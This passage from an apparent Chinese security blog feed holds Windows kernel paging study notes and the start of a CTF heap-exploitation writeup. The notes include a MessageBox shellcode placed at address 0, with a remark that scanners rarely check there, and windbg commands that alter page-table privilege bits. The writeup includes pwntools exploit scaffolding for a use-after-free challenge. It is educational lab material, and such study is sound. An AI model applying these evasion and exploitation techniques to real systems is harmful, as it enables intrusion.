class="string">&quot;addr=%08x\n&quot;</span>,addr);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="type">int</span> *x=<span class="literal">NULL</span>;</span><br><span class="line">    *x=<span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,*x);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>等待第一次分配输出地址</p><img src="/2024/11/10/WindowsKernel4/1.png" class=""><p>计算 PDI，PTI 的时候不要偷懒 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000000101100000000000000000</span><br><span class="line">0000000000</span><br><span class="line">0</span><br><span class="line">0101100000</span><br><span class="line">0x160</span><br><span class="line">000000000000</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意上面的代码中加入了 memset，这是因为线性地址只有第一次读&#x2F;写的时候会挂物理页，如果只申请没有读写则不会挂物理页。</p><img src="/2024/11/10/WindowsKernel4/2.png" class=""><p>我们尝试把这个页挂在零地址上，这里查看一下 PDI 为 0 的物理地址，如上图所示的值为 0x5a1eb000，这个物理地址必然没有被挂上物理页，我们把刚刚那个页的PTE写到线性地址 0 上。</p><p>使用 windbg 命令 <code>!ed 0x5a1eb000 2b13a847</code>。</p><img src="/2024/11/10/WindowsKernel4/3.png" class=""><p>现在 0 地址挂上了物理页，我们再看看能否继续运行。</p><img src="/2024/11/10/WindowsKernel4/4.png" class=""><p>发现没有问题，完美运行通过，而如果此时去读刚刚 addr 分配的线性地址就会发现，值同样也是 0x12345678，而对应的物理页肯定也是这个值，这里对代码稍作修改再次输出。</p><img src="/2024/11/10/WindowsKernel4/5.png" class=""><p>这点也论证了同一个物理页是可以被挂上不同的线性地址，这里展示的是同一个进程不同的线性地址。而不同进程的线性地址同样也能挂同一个物理页，也就是所谓的共享内存（一个进程修改，另一个进程会得到修改的结果）。</p><h2 id="零地址写shellcode"><a href="#零地址写shellcode" class="headerlink" title="零地址写shellcode"></a>零地址写shellcode</h2><p>Windows 的 shellcode，通常情况下，shellcode 藏在 0 线性地址是比较有效的，因为大部分扫描器通常不会去动 0 这一片的地址，而挂页的时候，是否可执行是通过 PTE 决定的。也就是说，同样的一个物理页，你可以以只读形式挂在 0x400000 这样的一个线性地址，同时还可以以读写的形式挂在 0 地址，这是可行的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*funcptr)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID addr=VirtualAlloc(<span class="literal">NULL</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr=%08x\n&quot;</span>,addr);</span><br><span class="line">    BYTE shellcode[]=&#123;</span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0x6A</span>,<span class="number">0x00</span>, <span class="comment">//push 0</span></span><br><span class="line">        <span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,xxx</span></span><br><span class="line">        <span class="number">0xFF</span>,<span class="number">0xD0</span>, <span class="comment">//call eax</span></span><br><span class="line">        <span class="number">0xC3</span>, <span class="comment">//ret</span></span><br><span class="line">    &#125;;</span><br><span class="line">    *(DWORD *)(&amp;shellcode[<span class="number">9</span>])=(DWORD)MessageBox;</span><br><span class="line">    <span class="built_in">memcpy</span>(addr,shellcode,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    funcptr func=<span class="number">0</span>;</span><br><span class="line">    func();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时这个shellcdoe也是比较简单的，仅仅是弹框而已。</p><img src="/2024/11/10/WindowsKernel4/6.png" class=""><p>这里因为用的是 10-10-12 分页，所以说 PTE 没有哪个位表示页是否可以执行，也就是说所有的页都可以执行，在 2-9-9-12 分页我们只需要把最高位设置为 0 即可。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">挂物理页的细节</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（3）——PAE分页（2-9-9-12分页）</title>
    <link href="https://xia0ji233.github.io/2024/11/09/WindowsKernel3/"/>
    <id>https://xia0ji233.github.io/2024/11/09/WindowsKernel3/</id>
    <published>2024-11-09T09:00:00.000Z</published>
    <updated>2024-11-09T09:36:32.546Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下2-9-9-12分页，也叫PAE分页</p><span id="more"></span><h2 id="为什么要有2-9-9-12分页"><a href="#为什么要有2-9-9-12分页" class="headerlink" title="为什么要有2-9-9-12分页"></a>为什么要有2-9-9-12分页</h2><p>这一定一定是最会疑惑的一个问题，为什么要多拆一个 2 出来呢？回答：扩展物理内存。</p><p>我们都知道，32位的系统最大只能装 4GB 的内存，多了它用不上，然而这个说法比较片面，实则它可以装更多的内存，在 10-10-12 分页的模式中，我们知道，物理地址就是 32 位的，而物理地址位宽决定了物理内存最大的限度。</p><p>那么 2-9-9-12 分页事实上就做到了这一点，它将物理地址扩展到了 64 位的模式，并赋予一些位特殊的意义。既然物理地址变成了 64 位，PDE 和 PTE 自然也变成了 64 位，那么原来一个页就装不下 1024 个 PDE 或者 PTE 了，而只能装 512 个，这就是中间两个 9 的来源。而我们只扩展了物理地址，没有扩展虚拟地址，因此虚拟内存（单个进程持有的线性地址）最大还是只有 4GB。 所以前面再多个 2 去满足 32 位。</p><h2 id="2-9-9-12分页简介"><a href="#2-9-9-12分页简介" class="headerlink" title="2-9-9-12分页简介"></a>2-9-9-12分页简介</h2><p>看完上一节之后大概能对 2-9-9-12 分页有个结构了，如下图所示：</p><img src="/2024/11/09/WindowsKernel3/1.png" class=""><p>多了一层名为<strong>页目录指针表（PDPTE）</strong>的东西，同样也是 64 位的大小，它的结构如下图所示：</p><img src="/2024/11/09/WindowsKernel3/2.png" class=""><p>它只使用了高四个字节的四位，但是为了对齐它填充到了 8 个字节，因此物理页地址被扩展到了 36 位，物理可用的内存达到了 64GB。</p><p>如果一个进程挂满物理页的情况下，在 10-10-12 分页模式下只能运行一个，但是在 2-9-9-12 分页模式下可以运行 16 个。</p><p>剩下的 PDE 和 PTE 扩展结构同理。</p><p>再有一点需要说的是，我们的页属性只有读和写两种，但是在三环的内存中，似乎还有<strong>可执行</strong>这个位，那么这个位在哪呢，实际上它将这个位填到了高位，也就是说 PTE，PDE，PDPTE这些大致结构应该如下图所示：</p><img src="/2024/11/09/WindowsKernel3/3.png" class=""><p>这是硬件层面上做的保护，一旦尝试执行的物理页中对应的 PTE 和 PDE 和 PDPTE 被置为 1，说明该页的数据不可以被执行，CPU尝试执行的时候会直接报出异常。</p><h2 id="2-9-9-12分页实践"><a href="#2-9-9-12分页实践" class="headerlink" title="2-9-9-12分页实践"></a>2-9-9-12分页实践</h2><p>同样拿记事本和 CE 来做实验。</p><img src="/2024/11/09/WindowsKernel3/4.png" class=""><p>得到线性地址 <code>0x00264EE8</code>，拆分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000001001100100111011101000</span><br><span class="line">按2-9-9-12拆开</span><br><span class="line">00</span><br><span class="line">0x0</span><br><span class="line">000000001</span><br><span class="line">0x1</span><br><span class="line">001100100</span><br><span class="line">0x64</span><br><span class="line">111011101000</span><br><span class="line">0xEE8</span><br></pre></td></tr></table></figure><p>一样的流程找到对应的物理页</p><img src="/2024/11/09/WindowsKernel3/5.png" class=""><p>于此同时可以发现，在PTE条目中，最高位被置为 1，表示该数据是不执行的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">来学一下2-9-9-12分页，也叫PAE分页</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（2）——页属性实验</title>
    <link href="https://xia0ji233.github.io/2024/11/07/WindowsKernel2/"/>
    <id>https://xia0ji233.github.io/2024/11/07/WindowsKernel2/</id>
    <published>2024-11-07T14:00:00.000Z</published>
    <updated>2024-11-07T14:20:26.620Z</updated>
    
    <content type="html"><![CDATA[<p>来具体学习一下页属性</p><span id="more"></span><h2 id="看前必读"><a href="#看前必读" class="headerlink" title="看前必读"></a>看前必读</h2><p><strong>本文所述的第 x 位均表示下标从 0 开始的计数制。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0000100010001</span><br><span class="line">           *</span><br></pre></td></tr></table></figure><p>例如上面星号所指示的位置表示第 1 位。</p><h2 id="有效属性"><a href="#有效属性" class="headerlink" title="有效属性"></a>有效属性</h2><p>可以关注内核函数 <strong>MmIsAddressValid</strong> 实现原理，取出虚拟机 <code>C:\Windows\System32\ntoskrnl.exe</code> 内核文件，找到该函数，F5可得以下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_48DCB8</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_DWORD *)(((a1 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>) - <span class="number">0x3FD00000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = *(_DWORD *)(((a1 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x3FFFFC</span>) - <span class="number">0x40000000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (v3 &amp; <span class="number">0x80</span>) != <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到第一个表达式 <code>(a1 &gt;&gt; 20) &amp; 0xFFC)</code>，可以认为是将地址右移了 22 位（取高10位），再左移了 2 位（<code>*4</code>），然后将该值减去 0x3FD00000，其实转换成加法就是 <code>+0xC0300000</code>，也就是我们的页目录表的线性地址。</p><p>如果该地址的最低位为 0，则返回 0（p位为0，无效）。</p><p>如果该地址的第7位为 1，说明是个大页，那么直接返回 1，整个页都是有效的，否则进行后续判断。</p><p>这里就是判断 PDE 的最低为是否为 0，若为 0 则还是无效。</p><p>否则返回第7位是否为 1 （这里存疑，不明白为什么PAT位为1才表示有效）。</p><p>总体，该函数的实现就是通过两个关键的线性地址 <code>0xC0000000</code> 和 <code>0xC0300000</code>，检查页表的属性来实现的功能。</p><h2 id="读写属性"><a href="#读写属性" class="headerlink" title="读写属性"></a>读写属性</h2><p>我是这么认为的：一个虚拟页，只要挂上了对应的物理页且有效，它必定可读，是否可写根据第 1 位标志位确定。</p><p>举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *s=<span class="string">&quot;123456789&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,s);</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,ds:dword ptr[s]</span><br><span class="line">        <span class="type">int</span> <span class="number">3</span></span><br><span class="line">        mov ds:byte ptr[eax],<span class="number">0x66</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试向字符串常量指向的地址进行写入则必定会出一个写入错误，那么在中间下个断点，然后修改挂的物理页。</p><img src="/2024/11/07/WindowsKernel2/1.png" class=""><p>拆分得到 PDI，PTI分别为 1，3，页内偏移为 0x12C</p><img src="/2024/11/07/WindowsKernel2/2.png" class=""><p>可以发现 PTE 的第一位为 0，即该页不可写。</p><p>同时也可以验证一下该物理页的正确性</p><img src="/2024/11/07/WindowsKernel2/3.png" class=""><p>将该物理页设为可写，使用命令 <code>!ed a6fab00C 0b8e2027</code>。</p><p>可以发现这个字符修改成功了</p><img src="/2024/11/07/WindowsKernel2/4.png" class=""><h2 id="特权位"><a href="#特权位" class="headerlink" title="特权位"></a>特权位</h2><p>当我们处于三环的权限，我们无法访问 U&#x2F;S 位为 0 的页，通常，32位地址下，我们无法访问 80 开头的地址，因为只有 0 环态下可以访问。</p><p>例如，我修改 gdt 所属的页，让gdt变得三环状态可读，参考以下步骤：</p><ul><li>通过 gdtr 找到 gdt 所在的页。</li><li>拆分地址找到对应的物理页对应的 PTE。</li><li>将物理页的 U&#x2F;S 位改为 1。</li></ul><p>这里我的 gdtr 为 80b93800</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PDI 1000000010</span><br><span class="line">0x202</span><br><span class="line">PTI 1110010011</span><br><span class="line">0x393</span><br><span class="line">off 100000000000</span><br><span class="line">0x800</span><br></pre></td></tr></table></figure><p>按照同样的方法，找到了 gdt 的物理页。</p><img src="/2024/11/07/WindowsKernel2/5.png" class=""><p>图中反的主要原因时物理页输出是 dd，虚拟页输出是 dq，会小端序的反转一下。</p><p>我们看到物理页的 PTE，结果是 <code>00b93163</code>，很明显第二位，也就是 U&#x2F;S 位为 0，表明是 0 环才可以访问的，那么将它改为三环可访问，使用命令 <code>!ed 0018a000+0x393*4 00b93167</code>。</p><p>结果发现好像还是不可读，是为什么呢？</p><p>对啦，原来PDE对应的U&#x2F;S位也要改，因为它们是与的关系，所以还需要再增加一个命令 <code>!ed 0000000000185000+0x202*4 0018a067</code>，做完这些，再验证一下三环程序能否读到 gdt 表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD val=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">val=<span class="number">0</span>;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov eax,ds:dword ptr[<span class="number">0x80b93808</span>]</span><br><span class="line">mov ds:dword ptr[val],eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,val);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，PTE基本最后映射的都是同一个，但是PDE不一样，因此需要这么操作才能实验成功：</p><ul><li>运行程序，中断。</li><li>找到该程序 CR3 的值，得到 PDE，将PDE的U&#x2F;S位改为1（每次重新运行必须做这件事）</li><li>根据PDE找到对应的PTE，将PTE的U&#x2F;S位改为 1（只需要改一次就可以）</li></ul><img src="/2024/11/07/WindowsKernel2/6.png" class=""><p>可以看到，程序能够成功读取gdt表的四个字节。</p><h2 id="访问位"><a href="#访问位" class="headerlink" title="访问位"></a>访问位</h2><p>这个属性不太好做实验验证，只需要知道：访问（读或写）过了则为 1，否则为0。</p><h2 id="脏位"><a href="#脏位" class="headerlink" title="脏位"></a>脏位</h2><p>写过了则为 1，否则为0，且只有PTE具有这个属性。</p><h2 id="其余位"><a href="#其余位" class="headerlink" title="其余位"></a>其余位</h2><p>其余位都跟缓存相关，实验自己不太会设计了，咕咕吧，等后面有能力了再来验证。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15363603.html">https://www.cnblogs.com/wingsummer/p/15363603.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_4/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_4&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">来具体学习一下页属性</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>强网杯S8初赛pwn writeup</title>
    <link href="https://xia0ji233.github.io/2024/11/07/qwb2024_pre/"/>
    <id>https://xia0ji233.github.io/2024/11/07/qwb2024_pre/</id>
    <published>2024-11-07T09:00:00.000Z</published>
    <updated>2024-11-12T16:01:02.742Z</updated>
    
    <content type="html"><![CDATA[<p>本次强网杯初赛做出两道pwn题，把详细题解写一下记录。</p><span id="more"></span><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p><a href="baby_heap_9a1b773b8406335f895bef78b2d8b8f3.zip">附件下载</a></p><img src="/2024/11/07/qwb2024_pre/1.png" class=""><p>2.35 的版本，IDA打开，堆菜单题，经典增删改查之外，还有两个额外的操作，一个是环境变量，另一个是任意地址写 0x10 字节。</p><p>del 里面有很明显的UAF漏洞。</p><img src="/2024/11/07/qwb2024_pre/2.png" class=""><p>show 只有一次机会，但是可以同时将 libc 和堆地址一起泄露出来，只需要我们释放两个相同大小的堆块之后，bk_nextsize 和 fd_nextsize 上面就会携带堆的地址，然而我自己的做法中没有用到。</p><p>交互函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.231.2&#x27;,)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;show:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">env</span>(<span class="params">ch</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;sad !&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr1,payload</span>):</span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;addr&#x27;</span>,p64(addr1))</span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure><p>先add出四个堆块，把 1 3 free 掉，再打印出 3 堆块的内容，即可连带泄露 libc 和堆地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2024/11/07/qwb2024_pre/3.png" class=""><p>注意到选项 6 并不是任意地址写，而是有一定限制的，</p><img src="/2024/11/07/qwb2024_pre/4.png" class=""><p>这里说实话不知道是不是 IDA 解析有问题。因为理论上来说 stdin 是 <code>FILE *</code> 类型，占 8 字节，因此 <code>&amp;stdin[512]</code> 等同于 stdin 的地址加上 <code>512*8=4096=0x1000</code>，但是将视角调到汇编时会发现 </p><img src="/2024/11/07/qwb2024_pre/5.png" class=""><p>它往后加了 0x1b000 的地址，通常情况下，以汇编为准一定没问题（以上是做题时的想法），但是后来才发现犯了一个错误，stdin 的确是 FILE * 类型的，但是 <code>stdin[0]</code> 是 FILE 类型的，直接的 stdin 是一个指向 <code>_IO_2_1_stdin_</code> 的指针，类型为 FILE，在 gdb 里面也很容易观察到这一点。</p><img src="/2024/11/07/qwb2024_pre/6.png" class=""><p>这里主要观察这个 &amp;stdin[512] 与 stdin 的差值，以及可以发现，它所禁用的这个范围就是 libc <code>_IO_2_1_stdin_</code> 之后的data 段，全部不允许写。</p><p>而另外一个条件就有意思了，不能超过 80 开头的一个地址，基本不会触发，所以目标很明确，让我们去写 libc <code>_IO_2_1_stdin_</code> 之前的 data 段，或者是写堆段，程序段写不了因为没有办法泄露地址。</p><p>先考虑前者，来看看之前的 data 段存了哪些内容。</p><img src="/2024/11/07/qwb2024_pre/7.png" class=""><p>发现基本是 got 表，于是尝试输出看看 libc 的 got 表，发现都是跟字符串操作的相关函数</p><img src="/2024/11/07/qwb2024_pre/8.png" class=""><p>看来可以尝试在这里找一个函数作为跳板，能不能 <code>one_gadget</code> 呢？显然不能，这题有沙箱。</p><img src="/2024/11/07/qwb2024_pre/9.png" class=""><p>除非你能找到一个 execveat 系统调用执行的 <code>one_gadget</code> 这题才能直接一键利用。</p><p>同时注意到选项 5 